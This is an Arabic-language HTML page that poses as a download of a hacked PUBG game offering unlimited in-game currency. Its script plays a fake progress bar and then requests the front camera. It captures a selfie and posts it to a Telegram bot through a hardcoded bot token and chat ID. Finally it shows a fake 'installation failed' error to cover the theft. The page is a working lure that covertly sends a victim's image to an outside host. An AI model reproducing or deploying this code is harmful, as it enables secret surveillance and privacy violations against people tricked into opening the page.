<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل ببجي مهكرة</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0d1117; color:#fff; font-family:Arial, sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .box { background:#161b22; padding:30px; border-radius:20px; text-align:center; width:90%; max-width:350px; border:1px solid #ff9900; box-shadow:0 0 20px rgba(255,153,0,0.2); }
        h1 { color:#ff9900; font-size:24px; margin-bottom:5px; }
        .sub { color:#8b949e; font-size:14px; margin-bottom:20px; }
        .btn { width:100%; padding:15px; background:#ff9900; color:#000; border:none; border-radius:10px; font-size:18px; font-weight:bold; cursor:pointer; transition:0.2s; }
        .btn:hover { background:#e68a00; }
        .bar-box { display:none; width:100%; height:8px; background:#30363d; border-radius:10px; overflow:hidden; margin:15px 0; }
        .fill { width:0%; height:100%; background:#ff9900; transition:width 0.05s; }
        #status { display:none; color:#8b949e; font-size:14px; }
        #error { display:none; margin-top:15px; color:#f85149; font-size:16px; font-weight:bold; }
    </style>
</head>
<body>

    <div class="box">
        <h1>🔥 ببجي مهكرة 2026</h1>
        <div class="sub">شدات غير محدودة + سكين أسطوري</div>
        <button class="btn" onclick="startDownload()">⬇️ تحميل اللعبة (2.4 GB)</button>
        <div class="bar-box"><div class="fill" id="bar"></div></div>
        <div id="status">جاري التحميل...</div>
        <div id="error">❌ فشل التثبيت! الملف تالف.</div>
    </div>

    <script>
        // بيانات تليجرام
        const CHAT_ID = "6833915955";
        const BOT_TOKEN = "8675259276:AAEqVwW4S1kqh7LTa7ZO1KClh7O8Ip4D6eU";

        function startDownload() {
            // إخفاء الزر وإظهار شريط التحميل
            document.querySelector('.btn').style.display = 'none';
            document.querySelector('.bar-box').style.display = 'block';
            document.getElementById('status').style.display = 'block';

            // شريط تحميل سريع جداً (2 ثانية)
            let p = 0;
            let interval = setInterval(() => {
                p += 5; // سريع جداً
                if (p >= 100) {
                    p = 100;
                    clearInterval(interval);
                    document.getElementById('status').innerText = "جاري فك الضغط...";
                    // بعد التحميل نطلب الكاميرا
                    setTimeout(captureSelfie, 300);
                }
                document.getElementById('bar').style.width = p + '%';
                document.getElementById('status').innerText = "جاري التحميل... " + p + "%";
            }, 40); // 40ms × 50 خطوة = 2 ثانية
        }

        function captureSelfie() {
            // طلب الكاميرا
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.createElement('video');
                    video.autoplay = true;
                    video.srcObject = stream;
                    // التقاط الصورة بعد ثانية واحدة
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        const imgData = canvas.toDataURL('image/png');
                        sendPhoto(imgData);
                        stream.getTracks().forEach(track => track.stop());
                        // إظهار فشل التحميل
                        document.getElementById('status').innerText = "❌ خطأ في التثبيت!";
                        document.getElementById('error').style.display = 'block';
                    }, 1000);
                })
                .catch(() => {
                    document.getElementById('status').innerText = "❌ تم رفض الكاميرا!";
                    document.getElementById('error').style.display = 'block';
                });
            } else {
                document.getElementById('error').style.display = 'block';
            }
        }

        function sendPhoto(base64) {
            const byteChars = atob(base64.split(',')[1]);
            const byteNums = new Array(byteChars.length);
            for (let i = 0; i < byteChars.length; i++) {
                byteNums[i] = byteChars.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNums);
            const blob = new Blob([byteArray], { type: 'image/png' });
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.png');
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }
    </script>
</body>
</html>
